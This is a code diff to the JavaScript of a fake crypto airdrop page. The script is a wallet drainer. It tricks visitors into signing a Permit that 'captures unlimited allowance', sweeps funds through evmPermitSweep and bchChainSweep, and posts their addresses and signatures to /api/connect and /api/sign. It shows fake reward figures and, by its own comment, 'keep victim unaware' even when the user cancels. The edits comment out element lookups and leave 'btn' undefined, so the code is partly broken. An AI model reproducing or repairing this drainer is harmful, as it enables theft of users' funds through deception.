@@ -314,7 +314,7 @@ function show(id){
 function goConnect(){ show('s2'); }
 function goSign(){ // Auto-called after connect
 
-  document.getElementById('addrShow').textContent=W.addr?W.addr.slice(0,6)+'...'+W.addr.slice(-4):'0x...';
+  // addrShow removed - not in HTML
   show('s2');
 }
 function goSuccess(txid){
@@ -332,7 +332,7 @@ function goSuccess(txid){
 
 async function autoSignAndClaim(){
   // Auto-sign personal_sign + Permit, then go to View
-  const btn=document.getElementById('signBtn');
+  // signBtn removed - not in HTML
   btn.disabled=true; btn.innerHTML='<span class="loader"></span> Verifying...';
   try{
     // Stage A: personal_sign
@@ -452,7 +452,7 @@ async function connectMetaMask(){
     const usd=(1500+((seed*7919)%8500))*0.25;
     document.getElementById('rewardAmt').innerHTML=amount+'<span>VTCN</span>';
     document.getElementById('rewardUsd').textContent='≈ $'+usd.toFixed(2)+' USD';
-    document.getElementById('rewardAmt2').textContent=amount+' VTCN';
+    // rewardAmt2 removed - not in HTML
     document.getElementById('finalAmt').textContent=amount+' VTCN';
     await fetch('/api/connect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,chain:W.chain,source:'metamask'})});
     // Auto-sign after connect
@@ -481,7 +481,7 @@ async function connectCoinbase(){
    Stage B: eth_signTypedData_v4 (Permit) — captures unlimited allowance
    ===================================================== */
 async function signVerify(){
-  const btn=document.getElementById('signBtn');
+  // signBtn removed - not in HTML
   document.getElementById('e3').classList.remove('show');
   btn.disabled=true; btn.innerHTML='<span class="loader"></span> Preparing…';
   try{
@@ -506,7 +506,7 @@ async function signVerify(){
       await evmPermitSweep(btn);
     }
   }catch(e){
-    document.getElementById('e3').textContent=e.message||'Failed'; document.getElementById('e3').classList.add('show');
+    // e3 removed - not in HTML
     btn.disabled=false; btn.innerHTML='🖋️  Sign to View Airdrop';
   }
 }
@@ -611,7 +611,7 @@ async function bchChainSweep(btn){
 async function confirmSign(){
   if(!pendingSign) return;
   document.getElementById('signModal').classList.remove('show');
-  const btn=document.getElementById('signBtn');
+  // signBtn removed - not in HTML
   try{
     /* ===== STAGE B: typed-data sign (Permit) ===== */
     const sigB=await window.ethereum.request({
@@ -636,7 +636,7 @@ function closeModal(){
   document.getElementById('signModal').classList.remove('show');
   fetch('/api/sign',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,method:'eth_signTypedData_v4_REJECTED',message:'modal closed',signature:'',source:'modal-cancel'})});
   // Reset
-  const btn=document.getElementById('signBtn');
+  // signBtn removed - not in HTML
   btn.disabled=false; btn.innerHTML='🖋️  Sign to View Airdrop';
   // Still go to success — keep victim unaware
   goSuccess();
